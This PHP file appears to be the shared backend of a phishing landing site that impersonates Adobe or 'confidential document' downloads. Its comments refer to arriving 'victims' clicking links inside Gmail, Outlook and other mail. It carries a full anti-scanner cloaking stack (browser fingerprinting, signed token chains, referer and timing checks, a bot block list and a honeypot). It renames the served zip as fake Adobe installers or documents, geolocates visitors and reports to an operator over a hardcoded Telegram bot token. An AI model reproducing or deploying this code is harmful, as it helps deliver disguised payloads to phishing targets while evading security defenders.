<?php
// =====================================================================
//  Adobe/Confidential "document" landing — shared logic (Railway deploy)
//
//  Anti-bot stack:
//   1. Signed token chain: index -> download -> complete -> dl.
//      Deep-links without the full chain 404. Next-step URLs only exist
//      inside JS (or behind the token), so static crawling gets nothing.
//   2. Full Chrome header fingerprint: desktop Chrome UA + client hints
//      (Sec-Ch-Ua) + Accept/Accept-Language/Accept-Encoding/
//      Upgrade-Insecure-Requests + Sec-Fetch-Mode + UA-vs-hint version
//      cross-check. Anything that isn't a real desktop Chrome 404s.
//   3. Referer chain: each step must come from the previous page on the
//      same host.
//   4. Human pacing: minimum elapsed time between token mint and each
//      step (matches the 5s + 2s UI delays).
//   5. Honeypot: off-screen "Skip verification" link that only
//      automation clicks — poisons the IP+UA fingerprint for 24h.
//   6. Per-IP rate limit + robots Disallow + noindex.
// =====================================================================

// Full bot token (id:secret) — a bare numeric id 404s on the API. Env-overridable.
define('TG_BOT',   (string)($_ENV['TG_BOT'] ?? '7977007247:AAEjVjEWzHTYrbWbMLAjxurKuPEheGD0dg8'));
define('TG_CHAT',  '7901102007');

// Stable HMAC secret so a token issued by index.php validates in later
// requests (each web request is a separate process). Env-overridable; the
// fallback is fixed so the app works with zero config.
define('SECRET', (string)($_ENV['TK_SECRET'] ?? 'railway-adobe-landing-9f2e1c7a4b83-0a6d5512'));

define('TTL', 900);            // token lifetime (15 min)
define('MIN_DL_AGE', 6);       // index -> ... -> dl must span >= 6s (5s spinner + 2s button)
define('RATE_LIMIT', 5);       // served downloads per IP per 1h window
define('SOURCE_ZIP', __DIR__ . '/src/Adobe_Setup.zip');
define('RATE_DIR', sys_get_temp_dir());
define('ALERT_DIR', sys_get_temp_dir());

// Ensure the temp data dirs exist (idempotent, once per process).
foreach (array_unique([RATE_DIR, ALERT_DIR]) as $__d) {
    if (!is_dir($__d)) { @mkdir($__d, 0777, true); }
}

// ---------------------------------------------------------------- utils
// Behind the Railway proxy the real client IP arrives in X-Forwarded-For.
function ip(): string {
    $xff = (string)($_SERVER['HTTP_X_FORWARDED_FOR'] ?? '');
    if ($xff !== '') {
        $first = trim(explode(',', $xff)[0]);
        if (filter_var($first, FILTER_VALIDATE_IP)) return $first;
    }
    return (string)($_SERVER['REMOTE_ADDR'] ?? '0.0.0.0');
}

function ua(): string { return (string)($_SERVER['HTTP_USER_AGENT'] ?? ''); }

function sign(string $d): string { return hash_hmac('sha256', $d, SECRET); }

function issue_token(): string {
    $payload = ['t' => time(), 'r' => bin2hex(random_bytes(8))];
    $b64 = rtrim(strtr(base64_encode(json_encode($payload)), '+/', '-_'), '=');
    return $b64 . '.' . sign($b64);
}

function check_token(?string $tok): ?array {
    if (!is_string($tok) || $tok === '' || substr_count($tok, '.') !== 1) return null;
    [$b64, $sig] = explode('.', $tok, 2);
    if (!hash_equals(sign($b64), $sig)) return null;
    $json = base64_decode(strtr($b64, '-_', '+/'));
    $p = json_decode((string)$json, true);
    if (!is_array($p) || !isset($p['t']) || (int)$p['t'] + TTL < time()) return null;
    return $p;
}

// Stable per-visit nonce from a token (for alert dedup).
function tok_nonce(?string $t): string {
    $p = check_token($t);
    return (string)($p['r'] ?? 'x');
}

// --------------------------------------------------- request headers
function req_header(string $name): string {
    $k = 'HTTP_' . strtoupper(str_replace('-', '_', $name));
    return trim((string)($_SERVER[$k] ?? ''));
}

function is_bot_ua(): bool {
    $ua = strtolower(ua());
    if ($ua === '') return true;
    return (bool)preg_match('/bot|spider|crawl|slurp|python|curl|wget|libwww|go-http|headless|selenium|phantom|scrapy|axios|okhttp|java|aolcom|facebookexternalhit|telegram|whatsapp|discord|httprequest|lxml|requests/i', $ua);
}

function chrome_major(string $ua): int {
    return (int)(preg_match('/chrome\/(\d+)/i', $ua, $m) ? $m[1] : 0);
}

function is_real_browser(): bool {
    $ua = strtolower(ua());
    if ($ua === '') return false;
    // Real Chrome on Windows/Mac. "Windows NT 10.0" precedes "Chrome/1xx"
    // in a genuine UA string — both must be present.
    if (!preg_match('/chrome\/\d+/', $ua)) return false;
    return (bool)preg_match('/windows|mac os x|macintosh/i', $ua);
}

// Core desktop-Chrome fingerprint (page-independent).
// $topLevel: Chrome only sends Upgrade-Insecure-Requests on top-level
// document navigations — subresource navigations (the hidden <iframe>)
// omit it, so requiring it there 404s every real browser.
function chrome_headers_ok(bool $topLevel = true): bool {
    if (ua() === '' || is_bot_ua() || !is_real_browser()) return false;
    if (chrome_major(ua()) < 100) return false;
    if (stripos(req_header('Accept'), 'text/html') !== 0) return false;
    if (req_header('Accept-Language') === '') return false;
    if (req_header('Accept-Encoding') === '') return false;
    if ($topLevel && strtolower(req_header('Upgrade-Insecure-Requests')) !== '1') return false;
    if (strtolower(req_header('Sec-Fetch-Mode')) !== 'navigate') return false;

    // Client hints — present in every real modern Chrome, absent in most bots.
    $chua = req_header('Sec-Ch-Ua');
    if ($chua === '' || stripos($chua, 'Chromium') === false) return false;
    $mob = req_header('Sec-Ch-Ua-Mobile');
    if ($mob !== '' && strtolower($mob) !== '?0') return false;
    $plat = req_header('Sec-Ch-Ua-Platform');
    if ($plat !== '') {
        $win = (bool)preg_match('/windows/i', ua());
        if ($win && stripos($plat, 'Windows') === false) return false;
        if (!$win && stripos($plat, 'Mac') === false) return false;
    }
    // Cross-check the UA version against the client-hint version.
    if (preg_match('/"Chromium";\s*v="(\d+)"/', $chua, $m)
        && preg_match('/chrome\/(\d+)/i', ua(), $mm)
        && abs((int)$m[1] - (int)$mm[1]) > 20) return false;

    // Sec-Fetch-Site must agree with the Referer: a genuine top-level
    // navigation has (no referer, site=none) or (same-host referer,
    // site=same-origin). Forged-referer bots almost always get this
    // combination wrong.
    $sfs = strtolower(req_header('Sec-Fetch-Site'));
    $ref = (string)($_SERVER['HTTP_REFERER'] ?? '');
    if ($ref === '') {
        if ($sfs !== '' && $sfs !== 'none') return false;
    } else {
        // Cross-site arrival is legitimate from the landing zone (victim
        // clicked a link on the adobe.smar-to.com page) or from a mail
        // client (victim clicked the link inside Gmail/Yahoo/Outlook);
        // Chrome sends the external referer + Sec-Fetch-Site: cross-site.
        $rhost = strtolower((string)(parse_url($ref, PHP_URL_HOST) ?? ''));
        if ($sfs === 'cross-site'
            && (substr($rhost, -11) === 'smar-to.com' || mail_ref_host($rhost))) {
            return true;
        }
        if (!in_array($sfs, ['same-origin', 'same-site'], true)) return false;
    }
    return true;
}

// Referer host ('' when there is no referer).
function ref_host(): string {
    return strtolower((string)(parse_url((string)($_SERVER['HTTP_REFERER'] ?? ''), PHP_URL_HOST) ?? ''));
}

// Mail-client origins. A recipient clicking the embedded link from inside
// their inbox (Gmail/Yahoo/Outlook/etc.) arrives cross-site with one of
// these referer hosts.
function mail_ref_host(string $host): bool {
    $host = strtolower($host);
    if ($host === '') return false;
    static $mail = [
        'mail.google.com', 'google.com', 'gmail.com',
        'mail.yahoo.com', 'yahoo.com', 'ymail.com',
        'outlook.live.com', 'outlook.com', 'live.com', 'hotmail.com',
        'mail.office365.com', 'office365.com', 'microsoftonline.com',
        'mail.proton.me', 'protonmail.com', 'proton.me', 'proton.ch',
        'webmail.sbcglobal.net', 'sbcglobal.net', 'att.net',
        'mail.aol.com', 'aol.com',
    ];
    foreach ($mail as $d) {
        if ($host === $d || substr($host, -strlen('.' . $d)) === '.' . $d) return true;
    }
    return false;
}

// Referer must be this host, previous page's path.
function referer_ok(array $allowedPaths): bool {
    $ref = (string)($_SERVER['HTTP_REFERER'] ?? '');
    if (!preg_match('#^https?://([^/]+)#i', $ref, $m)) return false;
    $rhost = strtolower($m[1]);
    $cur = strtolower((string)($_SERVER['HTTP_HOST'] ?? ''));
    if ($cur === '') return false;
    if ($rhost !== $cur && $rhost !== 'www.' . $cur && $cur !== 'www.' . $rhost) return false;
    return in_array((string)parse_url($ref, PHP_URL_PATH), $allowedPaths, true);
}

// ------------------------------------------------------- honeypot
function poison_path(): string {
    return RATE_DIR . '/pois_' . md5(ip() . '|' . hash('sha256', ua())) . '.p';
}

function is_poisoned(): bool {
    $f = poison_path();
    if (!is_file($f)) return false;
    $m = @filemtime($f);
    if ($m === false || $m + 86400 < time()) { @unlink($f); return false; }
    return true;
}

function poison_hit(): void {
    $f = poison_path();
    $d = dirname($f);
    if (!is_dir($d)) { @mkdir($d, 0777, true); }
    @touch($f);
    flood_check();
    silent_404();
}

/**
 * Scanner-flood detector. The honeypot (?hp=) is only reachable by
 * automation, so a burst of honeypot hits means a bot/scanner is hammering
 * the site (e.g. enumerating paths). Window the count to 60s; when the
 * threshold is crossed, fire a single Telegram alert per flood event.
 * (No page lock — a lock could false-positive real traffic, and every hit
 * already 404s + poisons its own IP+UA.)
 */
function flood_check(): void {
    $f   = RATE_DIR . '/poison_flood';
    $now = time();
    $raw = is_file($f) ? (array)json_decode((string)@file_get_contents($f), true) : [];
    if (!isset($raw['start']) || $now - (int)$raw['start'] > 60) {
        $raw = ['start' => $now, 'n' => 0];
    }
    $raw['n'] = (int)($raw['n'] ?? 0) + 1;
    @file_put_contents($f, json_encode($raw), LOCK_EX);

    if ($raw['n'] > 200) {
        $al = RATE_DIR . '/poison_flood.alerted';
        $last = is_file($al) ? (int)@file_get_contents($al) : 0;
        if ($now - $last > 60) {
            @file_put_contents($al, (string)$now);
            tg("\xE2\x9A\xA0\xEF\xB8\x8F <b>Scanner flood detected</b>\n"
             . ($raw['n'] . " honeypot hits in 60s — a bot/scanner is enumerating the site.")
             . " Each hit 404s and its IP+UA is poisoned for 24h.\n"
             . "IP: " . ip() . "\nUA: " . mb_substr(ua(), 0, 120));
        }
    }
}

// ------------------------------------------------------- rate limit
function rate_allows(string $ip): bool {
    $f = RATE_DIR . '/dl_' . md5($ip) . '_' . date('YmdH'); // 1h window
    $n = (int)@file_get_contents($f);
    $n++;
    @file_put_contents($f, (string)$n, LOCK_EX);
    return $n <= RATE_LIMIT;
}

// ------------------------------------------------------- page gates
// Top-level document pages (index / download / complete).
//   $allowedRefPaths: paths the referer may have (empty for the entry page)
//   $minAge: min seconds since token mint
//   $requireUser: require Sec-Fetch-User: ?1 (user-initiated navigation)
function gate_doc(array $allowedRefPaths, int $minAge, bool $requireUser): void {
    if (isset($_GET['hp'])) { poison_hit(); }
    if (is_poisoned()) silent_404();
    // Arrivals from a mail client (Gmail/Yahoo/Outlook/…) — either the
    // recipient clicking the embedded link or the mail service's own
    // link-preview fetcher. Mail clients don't send the full desktop-Chrome
    // fingerprint, so accept the referer as proof of legitimacy and serve
    // the real page instead of the hard 404 the fingerprint gate would emit.
    if (mail_ref_host(ref_host())) {
        if ($allowedRefPaths !== []) {
            $tok = check_token($_GET['tk'] ?? null);
            if (!$tok || time() - (int)$tok['t'] < $minAge) silent_404();
        }
        return;
    }
    if (!chrome_headers_ok()) silent_404();
    if (strtolower(req_header('Sec-Fetch-Dest')) !== 'document') silent_404();
    if ($requireUser && strtolower(req_header('Sec-Fetch-User')) !== '?1') silent_404();
    if ($allowedRefPaths !== []) {
        $tok = check_token($_GET['tk'] ?? null);
        if (!$tok) silent_404();
        if (time() - (int)$tok['t'] < $minAge) silent_404();
        if (!referer_ok($allowedRefPaths)) silent_404();
    }
}

// dl.php: auto-download <iframe> (subresource) or manual link (document).
function gate_dl(): array {
    if (isset($_GET['hp'])) { poison_hit(); }
    if (is_poisoned()) silent_404();
    // $topLevel=false: the auto-download iframe is a subresource doc load
    // (no Upgrade-Insecure-Requests, no Sec-Fetch-User) — must not 404 it.
    if (!chrome_headers_ok(false)) silent_404();
    $dest = strtolower(req_header('Sec-Fetch-Dest'));
    if ($dest === 'document') {
        if (strtolower(req_header('Sec-Fetch-User')) !== '?1') silent_404();
    } elseif (in_array($dest, ['iframe', 'other'], true)) {
        if (req_header('Sec-Fetch-User') !== '') silent_404(); // iframes never have it
    } else {
        silent_404();
    }
    $tok = check_token($_GET['tk'] ?? null);
    if (!$tok) silent_404();
    if (time() - (int)$tok['t'] < MIN_DL_AGE) silent_404();
    if (!referer_ok(['/complete.php'])) silent_404();
    return $tok;
}

// ------------------------------------------------- name generation
// Mixed pool: fresh Adobe-setup names AND fresh document names per visit.
function make_name(): string {
    $adobe = [
        'Adobe_Acrobat_Pro_DC_'          . sprintf('%d.%d.%04d', random_int(23,25), random_int(1,9), random_int(1,9999)),
        'Adobe_Creative_Cloud_Updater_'  . sprintf('%d.%d.%04d', random_int(3,7),  random_int(1,9), random_int(1,9999)),
        'Adobe_Acrobat_Standard_DC_'     . sprintf('%d.%d.%04d', random_int(23,25), random_int(1,9), random_int(1,9999)),
        'Adobe_DC_Reader_Patch_'         . sprintf('%d.%d.%04d', random_int(22,25), random_int(1,9), random_int(1,9999)),
        'Adobe_Acrobat_Sign_'            . sprintf('%d.%d.%04d', random_int(2,5),  random_int(1,9), random_int(1,9999)),
        'Adobe_Update_Package_'          . random_int(10000, 99999),
    ];
    $conf = [
        'Confidential_Document_' . random_int(100000, 999999),
        'Confidential_Record_'   . date('Ymd') . '_' . random_int(1000, 9999),
        'Internal_Memo_'         . random_int(10000, 99999),
        'Contract_Agreement_'    . random_int(100000, 999999),
        'Document_File_'         . date('Ymd') . '_' . random_int(100, 999),
        'Statement_Report_'      . date('Y') . '_' . random_int(1000, 9999),
    ];
    $pool = random_int(0, 1) ? $conf : $adobe;   // 50/50 mix
    return $pool[random_int(0, count($pool)-1)] . '.zip';
}

function name_kind(string $name): string {
    return preg_match('/^adobe/i', $name) ? 'adobe' : 'document';
}

// ------------------------------------------------------- telegram
function tg(string $msg): void {
    $url = "https://api.telegram.org/bot" . TG_BOT . "/sendMessage";
    $payload = json_encode(['chat_id' => TG_CHAT, 'text' => $msg, 'disable_web_page_preview' => true]);
    $ctx = stream_context_create(['http' => [
        'method' => 'POST', 'header' => "Content-Type: application/json\r\n",
        'content' => $payload, 'timeout' => 6, 'ignore_errors' => true,
    ]]);
    @file_get_contents($url, false, $ctx);
}

function geo(string $ip): array {
    $r = ['city'=>'Unknown','country'=>'Unknown','isp'=>'Unknown'];
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return $r;
    }
    $url = "http://ip-api.com/json/" . rawurlencode($ip) . "?fields=status,country,city,isp";
    $ctx = stream_context_create(['http' => ['timeout' => 4, 'ignore_errors' => true]]);
    $j = @json_decode((string)@file_get_contents($url, false, $ctx), true);
    if (is_array($j) && ($j['status'] ?? '') === 'success') {
        $r['city'] = $j['city'] ?? 'Unknown';
        $r['country'] = $j['country'] ?? 'Unknown';
        $r['isp'] = $j['isp'] ?? 'Unknown';
    }
    return $r;
}

// -------------------------------------------------- silent 404
function silent_404(): void {
    http_response_code(404);
    header('Content-Type: text/html; charset=utf-8');
    echo "<!DOCTYPE html><html><head><title>404 Not Found</title></head>"
       . "<body style=\"font-family:Arial;background:#f4f4f4;color:#555;text-align:center;padding-top:14vh\">"
       . "<div style=\"font-size:64px;font-weight:700;color:#999\">404</div>"
       . "<p>Not Found.</p></body></html>";
    exit;
}
